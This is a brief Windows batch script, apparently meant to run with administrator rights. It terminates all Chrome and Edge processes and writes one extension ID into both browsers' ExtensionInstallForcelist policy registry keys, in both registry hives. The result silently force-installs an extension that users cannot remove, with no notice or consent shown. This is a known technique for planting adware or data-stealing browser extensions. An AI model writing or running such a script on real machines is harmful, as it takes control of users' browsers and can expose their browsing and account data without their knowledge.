timeout 1 > NUL


taskkill /F /IM chrome.exe /T
taskkill /F /IM msedge.exe /T

set base32=HKLM\SOFTWARE
set base64=HKLM\SOFTWARE\WOW6432Node

set chrome=Google\Chrome
set msedge=Microsoft\Edge

set id=ahadfbdodjlhaenjigpaehpmlelflnag

REG ADD "%base32%\Policies\%chrome%\ExtensionInstallForcelist" /v "1" /t REG_SZ /d %id% /f
REG ADD "%base64%\Policies\%chrome%\ExtensionInstallForcelist" /v "1" /t REG_SZ /d %id% /f

REG ADD "%base32%\Policies\%msedge%\ExtensionInstallForcelist" /v "1" /t REG_SZ /d %id% /f
REG ADD "%base64%\Policies\%msedge%\ExtensionInstallForcelist" /v "1" /t REG_SZ /d %id% /f